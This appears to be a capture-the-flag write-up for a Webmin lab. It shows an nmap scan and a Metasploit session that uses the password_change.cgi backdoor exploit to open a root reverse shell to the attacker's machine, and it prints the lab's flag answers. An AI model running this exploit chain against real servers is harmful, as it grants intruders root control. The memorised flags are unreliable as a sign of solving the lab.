# AttackerKB  Vulnerability Analyzer

## Links 
- IP adderess -> 10.10.181.247
- There is no website found for this Ip address
- As there is no website there so there no issue with directory enumeration

- But wait a minute -> `10000/tcp open  http    MiniServ 1.890 (Webmin httpd)` what is this than!
- AttackerKB -> `https://attackerkb.com/`
- Potential vulnerability for webmin -> `https://attackerkb.com/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection?referrer=search`

## Port Scanning
```sh
nmap -sS -sV -O 10.10.181.247 >> ports.txt

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-08 01:43 EDT
Nmap scan report for 10.10.181.247
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=7/8%OT=22%CT=1%CU=37736%PV=Y%DS=5%DC=I%G=Y%TM=668B7
OS:CB9%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)S
OS:EQ(SP=108%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST
OS:11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F
OS:4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M
OS:508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.95 seconds

```
- I went for `http://10.10.181.247:10000` , but its giving
```sh
Error - Document follows

This web server is running in SSL mode. Try the URL https://ip-10-10-181-247.eu-west-1.compute.internal:10000/ instead.

```
- I've also tried that url but didn't work
- I tried another url just adding https -> `https://10.10.181.247:10000`
- A login page appears that of `webmin`
- Visit the webpage generated by this service. You should encounter an error due to SSL being present.
Change the URL to use HTTPS and ignore the exception. After this, view the certificate.
What hostname can we find on the cert details? On Firefox, you can view this by
clicking on the 'i' in the URL, then the '>' in Connection, 'More Information', and then 'View Certificate' on the Security tab.

## Pointers
- Always check the current version of ssh , ubuntu, ftp and  other stuff 
- If its not the current version there could be potential vulnerability on that version. 
- You can search it in the Attackerkb


## AttackerKb 
- This is a storage for vulnerabilities and its exploits
- we will find if there any vulnerability exists in the login functionality or not
- We found there is a metasploit module for the exploit
- Analyzing the attackerKb we found the vulnerability is a  supply chain attack

## Metaspoit
```sh

msf6 > search webmin

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1   auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
   2   exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
   3   exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
   4     \_ target: Unix In-Memory                    .                .          .      .
   5     \_ target: Linux Dropper (x86 & x64)         .                .          .      .
   6     \_ target: Linux Dropper (ARM64)             .                .          .      .
   7   exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   8   exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   9   auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   10  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   11    \_ target: Automatic (Unix In-Memory)        .                .          .      .
   12    \_ target: Automatic (Linux Dropper)         .                .          .      .



msf6 exploit(linux/http/webmin_backdoor) > set lhost tun0
lhost => 10.17.88.30
msf6 exploit(linux/http/webmin_backdoor) > set rhosts 10.10.95.101
rhosts => 10.10.95.101
msf6 exploit(linux/http/webmin_backdoor) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
msf6 exploit(linux/http/webmin_backdoor) > run

[*] Started reverse TCP handler on 10.17.88.30:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
whoami
[*] Command shell session 1 opened (10.17.88.30:4444 -> 10.10.95.101:55982) at 2024-07-08 05:51:48 -0400

root

root
cat /home/dark/user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
cat /root/root.txt
THM{UPDATE_YOUR_INSTALL}


```

## Flags
#### USER : THM{SUPPLY_CHAIN_COMPROMISE}
#### ROOT : THM{UPDATE_YOUR_INSTALL}


